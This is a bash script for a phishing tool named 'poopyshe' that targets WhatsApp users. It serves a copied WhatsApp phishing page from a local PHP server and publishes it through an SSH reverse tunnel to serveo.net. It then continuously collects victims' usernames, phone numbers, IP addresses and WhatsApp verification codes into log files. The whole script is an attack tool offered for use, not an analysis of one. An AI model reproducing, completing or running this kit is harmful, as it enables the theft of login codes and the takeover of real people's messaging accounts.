#!/bin/bash

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"  
RESETBG="$(printf '\e[0m\n')"

 printf "\e[1;92m"
echo -e "${WHITE}"

bash create_script.sh
## > /dev/null/ 2>&1 &

HOST='127.0.1'
PORT='8080'

LOADING_SHELL(){
printf "\e[1;92m"
clear
echo -e "[${RED} poopyshe ${WHITE}] ${WHITE}script Shell"
echo -e "[${RED} poopyshe ${WHITE}] ${BLACK}loading."
sleep 0.75
clear
echo -e "[${RED} poopyshe ${WHITE}]${WHITE} script Shell"
echo -e "[${RED} poopyshe ${WHITE}]${BLACK} loading.."
sleep 0.75
clear
echo -e "[${RED} poopyshe ${WHITE}]${WHITE} script Shell"
echo -e "[${RED} poopyshe ${WHITE}]${BLACK} loading...${WHITE}"
sleep 0.75
clear
BANNER_POOPY
}

SELECT(){
cat << EOF

${WHITE}[::] ${WHITE}Select an number :

${WHITE}[01] ${WHITE}WhatsApp   ${BLACK} attack phisher WhatsApp cod
${WHITE}[02] ${WHITE}Exit       ${BLACK} to close program poopyshe
${WHITE}[03] ${WHITE}About      ${BLACK} view about, creator, author...

EOF
read -p "${WHITE}Select:${BLUE} "

case $REPLY in
1 | 01)
website='whatsapp';
START_SERVER;
START_SERVEO_NET;;

*)

echo -ne "${RED}Erro! Try Again..."

esac

}

BANNER_POOPY(){
cat << EOF
welcome to poopyshe
try poopyshe --help to see the commands

${RED} ██▓███  ▒█████  ▒█████  ██▓███▓██   ██▓ ██████ ██░ ██▓█████ 
${RED}▓██░  ██▒██▒  ██▒██▒  ██▓██░  ██▒██  ██▒██    ▒▓██░ ██▓█   ▀ 
${RED}▓██░ ██▓▒██░  ██▒██░  ██▓██░ ██▓▒▒██ ██░ ▓██▄  ▒██▀▀██▒███   
${RED}▒██▄█▓▒ ▒██   ██▒██   ██▒██▄█▓▒ ▒░ ▐██▓░ ▒   ██░▓█ ░██▒▓█  ▄ 
${RED}▒██▒ ░  ░ ████▓▒░ ████▓▒▒██▒ ░  ░░ ██▒▓▒██████▒░▓█▒░██░▒████▒
${RED}▒▓▒░ ░  ░ ▒░▒░▒░░ ▒░▒░▒░▒▓▒░ ░  ░ ██▒▒▒▒ ▒▓▒ ▒ ░▒ ░░▒░░░ ▒░ ░
${RED}░▒ ░      ░ ▒ ▒░  ░ ▒ ▒░░▒ ░    ▓██ ░▒░░ ░▒  ░ ░▒ ░▒░ ░░ ░  ░
${RED}░░      ░ ░ ░ ▒ ░ ░ ░ ▒ ░░      ▒ ▒ ░░ ░  ░  ░  ░  ░░ ░  ░   
${RED}            ░ ░     ░ ░         ░ ░          ░  ░  ░  ░  ░  ░
${RED}                                ░ ░                          
EOF
 echo -e "\n${WHITE} Program created for you"

timeout 3s curl -fIs "https://web.whatsapp.com" > /dev/null
if [[ $? -eq 0 ]]; then
echo -e "${WHITE} Checking status => Program ${GREEN}on-line"
else
echo -e "${WHITE} Checking status => Program ${RED}off-line"
fi
SELECT
}

START_SERVER() {
	cp -rf ../.poopy/"$website"/* ../.server/www
	cd ../.server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}


START_SERVEO_NET() {
sleep 0.75;
printf "\e[1;92m"
printf "\n${WHITE}[-] ${WHITEBG} ${BLACK}http://$HOST:$PORT ${RESETBG} ${WHITE} Initializing..."
cd ../.server/www && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
sleep 2
echo ''
if [[ -e ../.server/www/linksender ]]; then
rm -rf ../.server/www/linksender
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$PORT' serveo.net 2> /dev/null > ../.server/www/linksender ' &
printf "\n"
sleep 7
send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" ../.server/www/linksender)
printf "\n"
printf "\e[1;92m"
echo -e "${WHITE}[-] URL: ${GREEN} $send_url"
printf "\n"
CAPTURE_DATA
}

ip() {
    IP=$(grep -a 'IP:' ../.server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
	echo -e "${WHITE}IP : $IP\n"
    cat ../.server/www/ip.txt >> ../auth/ip.dat
}


cod() {
    COD=$(grep -a 'Cod:' ../.server/www/cod.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
        echo -e "${WHITE}WhatsApp Cod : $COD\n"
}



meta_number(){
Name=$(grep -o 'Username:.*' ../.server/www/data.txt | awk -F ":." '{print  $NF}')
Number=$(grep -o 'Number:.*' ../.server/www/data.txt | awk -F ":." '{print  $NF}')
IFS=$'\n'
	echo -e "\n${WHITE}[+] Username  :   ${BLUE}$Name"
	echo -e "\n${WHITE}[+] Number    :   ${BLUE}$Number"
    cat ../.server/www/data.txt >> ../auth/data.dat
}

CAPTURE_DATA() {
printf "\e[1;92m"
	while true; do
        	if [[ -e "../.server/www/data.txt" ]]; then
	        echo -e "\n${GREEN}[${WHITE}!${GREEN}] WhatsApp Number Login !${WHITE} ~"
                echo -e "\n${WHITE}[-] Init cod"
			meta_number
			rm -rf ../.server/www/data.txt
        fi
		sleep 0.75
      if [[ -e "../.server/www/ip.txt" ]]; then
        echo -e "\n${WHITE}[!]${GREEN} NEW IP"
         ip
            rm -rf ../.server/www/ip.txt
fi
sleep 0.75
      if [[ -e "../.server/www/cod.txt" ]]; then
        echo -e "\n${WHITE}[!]${GREEN} Cod received"
         cod
            rm -rf ../.server/www/cod.txt
fi
sleep 0.75


	done
}

LOADING_SHELL


